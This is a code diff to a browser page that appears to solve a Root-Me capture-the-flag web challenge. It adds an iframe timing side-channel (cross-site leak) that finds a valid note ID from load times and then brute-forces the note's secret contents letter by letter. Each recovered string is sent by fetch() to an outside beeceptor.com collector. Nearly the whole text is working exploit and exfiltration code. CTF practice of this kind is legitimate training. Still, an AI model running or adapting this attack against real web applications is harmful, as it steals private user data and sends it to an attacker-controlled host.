@@ -30,6 +30,10 @@
         const iframe = document.getElementById('iframe');
         const status = document.getElementById('status');
         const logElement = document.getElementById('log');
+        const alphabet = "abcdefghijklmnopqrstuvwxyz";
+        let valid = 0;
+        let lastValidUrl = "";
+        let foundId = null;
 
         function loadUrl(url) {
             iframe.src = url;
@@ -44,16 +48,16 @@
             const url = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${currentIndex}`;
             status.textContent = `Loading: ${url}`;
 
-            const startTime = performance.now(); // Start timing
+            const startTime = performance.now();
             loadUrl(url);
 
-            iframe.onerror = function() {
-                console.log("error");
+            iframe.onerror = function () {
+                console.log("Error loading:", url);
             }
 
             iframe.onload = function () {
-                const endTime = performance.now(); // End timing
-                const loadTime = Math.round(endTime - startTime); // Calculate duration
+                const endTime = performance.now();
+                const loadTime = Math.round(endTime - startTime);
 
                 if (loadTime > 90) {
                     valid += 1;
@@ -65,12 +69,61 @@
                     if (valid < 4 && loadTime > 90) {
                         loadNextNote(currentIndex);
                     } else if (valid >= 4) {
-                        fetch("https://rootmexsleak.free.beeceptor.com/" + currentIndex); // Append to log
+                        foundId = currentIndex;
+                        console.log(`Valid ID found: ${foundId}`);
+                        startSearch(foundId, "");
                     } else {
                         loadNextNote(currentIndex + 1);
                     }
-                }, 10);
+                }, 0);
             };
+        }
+
+        function startSearch(id, searchStr) {
+            const url = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}/${searchStr}`;
+            status.textContent = `Searching: ${url}`;
+
+            const startTime = performance.now();
+            loadUrl(url);
+
+            iframe.onload = function () {
+                const endTime = performance.now();
+                const loadTime = Math.round(endTime - startTime);
+
+                if (loadTime > 500) {
+                    lastValidUrl = url;
+                    startSearch(id, searchStr + alphabet[0]); // Add a new letter
+                } else {
+                    // Move to the next letter in the alphabet
+                    let nextQuery = getNextQuery(searchStr);
+                    if (nextQuery) {
+                        startSearch(id, nextQuery);
+                    } else {
+                        fetch("https://rootmexsleak.free.beeceptor.com/" + searchStr);
+
+                        searchStr = searchStr.slice(0, -1);
+                        nextQuery = getNextQuery(searchStr);
+                        if (nextQuery) {
+                            startSearch(id, nextQuery);
+                        } else {
+                            return;
+                        }
+                    }
+                }
+            };
+        }
+
+        function getNextQuery(currentStr) {
+            if (currentStr === "") return "a"; // Start with 'a'
+
+            let chars = currentStr.split("");
+            const lastChar = chars[chars.length - 1];
+
+            if (lastChar == 'z') {
+                return null;
+            } else {
+                return currentStr.slice(0, -1) + String.fromCharCode(lastChar.charCodeAt(0) + 1);
+            }
         }
 
         loadNextNote(start);
